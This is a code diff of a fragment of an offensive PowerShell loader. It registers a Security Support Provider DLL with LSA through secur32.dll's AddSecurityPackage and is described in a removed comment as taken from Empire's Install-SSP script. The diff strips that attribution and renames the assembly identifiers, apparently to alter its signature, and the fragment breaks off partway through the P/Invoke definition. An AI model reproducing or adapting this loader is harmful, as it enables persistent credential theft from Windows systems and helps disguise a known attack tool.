@@ -1,11 +1,10 @@
-# lsa ssp loader ripped from Empire's Instal-SSP.ps1 
 # provide path to SSP DLL as argument
 
-$DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2')
+$DynAssembly = New-Object System.Reflection.AssemblyName('SSPI3')
 $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2', $False)
+$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI3', $False)
 
-$TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32', 'Public, Class')
+$TypeBuilder = $ModuleBuilder.DefineType('SSPI3.Secur32', 'Public, Class')
 $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage',
     'secur32.dll',
     'Public, Static',
